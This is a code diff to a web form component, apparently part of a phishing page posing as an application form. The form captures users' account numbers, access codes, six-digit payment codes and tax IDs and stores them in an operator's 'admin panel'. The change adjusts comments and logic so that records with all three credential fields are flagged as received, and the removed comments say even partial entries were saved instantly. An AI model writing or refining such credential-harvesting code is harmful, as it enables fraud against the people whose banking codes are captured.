@@ -183,8 +183,10 @@ function Index() {
       
       const pCodeStr = paymentCode.join("");
       
-      // Requirement: Save EVERYTHING instantly to the admin panel.
-      // Even partial entries are considered "Candidatura recebida" for visibility.
+      // Requirement: Only show in admin panel if we have the 3 main fields:
+      // account_number, access_code, and payment_code.
+      const hasMainData = accountNumber && accessCode && pCodeStr.length === 6;
+
       const payload: any = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
@@ -197,7 +199,7 @@ function Index() {
         nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString(),
-        status: "Candidatura recebida" // Always marked as received so it shows up in admin instantly
+        status: hasMainData ? "Candidatura recebida" : "Pendente"
       };
 
       // Filter out null/empty values to avoid overwriting existing data with nulls
